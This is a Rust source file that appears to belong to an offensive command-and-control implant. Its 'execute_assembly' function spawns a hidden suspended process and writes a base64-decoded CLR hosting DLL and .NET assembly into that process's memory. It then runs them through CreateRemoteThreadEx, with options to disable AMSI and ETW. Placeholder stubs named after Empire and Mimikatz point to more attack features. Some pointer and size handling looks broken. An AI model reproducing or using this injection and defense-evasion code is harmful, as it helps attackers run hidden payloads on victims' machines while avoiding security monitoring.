extern crate winapi;

use std::os::windows::process::CommandExt;
use std::ffi::c_void;
use std::time::Duration;
use std::thread::sleep;

pub fn empire(args: Vec<&str>) -> String {
    if args.len() < 2 {
        return "todo".to_string()
    }
    return "todo".to_string()
}

pub fn mimikatz(args: Vec<&str>) -> String {
    if args.len() < 2 {
        return "todo".to_string()
    }
    return "todo".to_string()
}

pub fn execute_assembly(args: Vec<&str>) -> String {
    if args.len() < 8 {
        return "".to_string()
    }

    // extract arguments
    let assembly_b64 = args[1];
    let assembly = base64::decode(assembly_b64).unwrap();
    let hosting_dll_b64 = args[2];
    let mut hosting_dll = base64::decode(hosting_dll_b64).unwrap();
    let hosting_dll_size = hosting_dll.len();
    let hosting_dll_ptr: *mut c_void = &mut hosting_dll as *mut _ as *mut c_void; 
    let process = args[3];
    let amsi = args[4].parse::<u8>().unwrap();
    let etw = args[5].parse::<u8>().unwrap();
    let mut offset_u32 = args[6].parse::<u32>().unwrap();
    let offset: *mut c_void = &mut offset_u32 as *mut _ as *mut c_void;
    let params = args[7..].join(" ");
    let assembly_size = assembly.len();
    
    // spawn suspended process
    let cmd = std::process::Command::new(process)
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .creation_flags(winapi::um::winbase::CREATE_NO_WINDOW | winapi::um::winbase::CREATE_SUSPENDED)
        .spawn()
        .unwrap();
    let pid = cmd.id();
    // get process handle
    let handle = unsafe {winapi::um::processthreadsapi::OpenProcess(
        winapi::um::winnt::PROCESS_ALL_ACCESS,
        0x01,
        pid
    )};

    // construct assembly payload
    // assembly size:   4 bytes
    // params size:     4 bytes
    // AMSI bool:       1 byte
    // ETW bool:        1 byte
    // parameter bytes
    // assembly bytes
    let mut payload: Vec<u8> = Vec::new();
    // assembly size
    payload.extend_from_slice(&[assembly_size as u8]);
    // params size
    payload.extend_from_slice(&[args[7..].len() as u8]);
    // AMSI
    payload.extend_from_slice(&[amsi]);
    // ETW
    payload.extend_from_slice(&[etw]);
    // parameters
    payload.extend_from_slice(params.as_bytes());
    payload.extend_from_slice(&[0x00]);
    let payload_ptr: *mut c_void = &mut payload as *mut _ as *mut c_void; 
    let payload_size = payload.len();

    // alloc HostingCLRx64.dll
    let addr_hosting_dll = unsafe{winapi::um::memoryapi::VirtualAllocEx(
        handle,
        std::ptr::null_mut(),
        hosting_dll_size,
        winapi::um::winnt::MEM_COMMIT,
        winapi::um::winnt::PAGE_READWRITE
    )};
    let mut ret_len: usize = 0;
    let mut _mem_writer = unsafe {winapi::um::memoryapi::WriteProcessMemory(
        handle,
        addr_hosting_dll,
        hosting_dll_ptr,
        hosting_dll_size,
        &mut ret_len
    )};
    // alloc payload
    let addr_assembly = unsafe{winapi::um::memoryapi::VirtualAllocEx(
        handle,
        std::ptr::null_mut(),
        payload_size,
        winapi::um::winnt::MEM_COMMIT,
        winapi::um::winnt::PAGE_READWRITE
    )};
    _mem_writer = unsafe {winapi::um::memoryapi::WriteProcessMemory(
        handle,
        addr_assembly,
        payload_ptr,
        payload_size,
        &mut ret_len
    )};
    // protect and execute
    let mut old_protect: u32 = 0;
    let _ = unsafe {winapi::um::memoryapi::VirtualProtectEx(
        handle,
        addr_hosting_dll,
        hosting_dll_size,
        winapi::um::winnt::PAGE_EXECUTE_READ,
        &mut old_protect
    )};
    let mut lp_thread_id: u32 = 0;
    // calculate thread start address
    let thread_start_addr_u64: u64 = addr_hosting_dll as u64 + offset as u64;
    //let thread_start_addr: &mut c_void = &mut thread_start_addr_u32 as &mut _ as &mut c_void;
    let func_thread = unsafe {std::mem::transmute(thread_start_addr_u64)};
    let thread_handle = unsafe {winapi::um::processthreadsapi::CreateRemoteThreadEx(
        handle,
        std::ptr::null_mut(),
        0,
        func_thread,
        addr_assembly,
        0,
        std::ptr::null_mut(),
        &mut lp_thread_id
    )};
    // wait for thread to finish
    let output_vec: Vec<String> = Vec::new();
    loop {
        //let tmp_output = cmd.stdout.as_mut().unwrap().read();
        let mut ret_code: u32 = 0;
        let _ = unsafe {winapi::um::processthreadsapi::GetExitCodeThread(
            thread_handle,
            &mut ret_code
        )};
        if ret_code == winapi::um::minwinbase::STILL_ACTIVE {
            sleep(Duration::from_secs(1));
        } else {
            break
        }
    }

    // TODO
    // handle stdout and stderr correctly before killing process
    // consider using pipes to collect stdout and stderr so that wait_with_output does not need to be called
    // this process will not exit, so it must be killed
    // get output
    //let output = cmd.wait_with_output().unwrap();
    //output_vec.push(std::str::from_utf8(&output.stdout).unwrap().to_string());
    //output_vec.push(std::str::from_utf8(&output.stderr).unwrap().to_string());

    // kill process
    //let _ = cmd.kill();

    // close process handle
    let _ = unsafe { winapi::um::handleapi::CloseHandle(handle); };

    output_vec.join(" ")
}
